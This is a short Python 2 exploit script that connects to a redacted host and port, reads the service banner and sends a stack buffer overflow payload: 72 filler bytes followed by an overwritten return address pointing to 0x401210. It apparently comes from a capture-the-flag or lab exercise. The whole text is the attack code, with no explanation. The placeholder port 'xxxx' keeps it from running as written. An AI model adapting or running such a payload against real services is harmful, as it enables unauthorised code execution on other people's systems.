import socket
 
buf="A"*72 +"\x10\x12\x40"+"\x00"*5 #Payload

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("xx.xx.xx.xx.",xxxx))
    s.recv(4000)
    print s.recv(1024)
    s.send(buf+"\r\n")
    print s.recv(1024)
    print s.recv(1024)
 
    
except:
    print "rerr"